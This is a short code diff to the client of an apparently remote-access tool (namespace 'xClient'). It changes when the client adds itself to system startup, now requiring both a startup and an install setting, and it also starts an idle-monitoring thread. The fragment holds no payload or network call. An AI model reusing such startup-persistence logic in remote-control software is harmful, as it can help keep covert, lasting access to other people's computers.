@@ -135,7 +135,7 @@ namespace xClient
 
                 new Thread(SystemCore.UserIdleThread).Start();
 
-                if (Settings.STARTUP)
+                if (Settings.STARTUP && Settings.INSTALL)
                 {
                     SystemCore.AddToStartup();
                 }
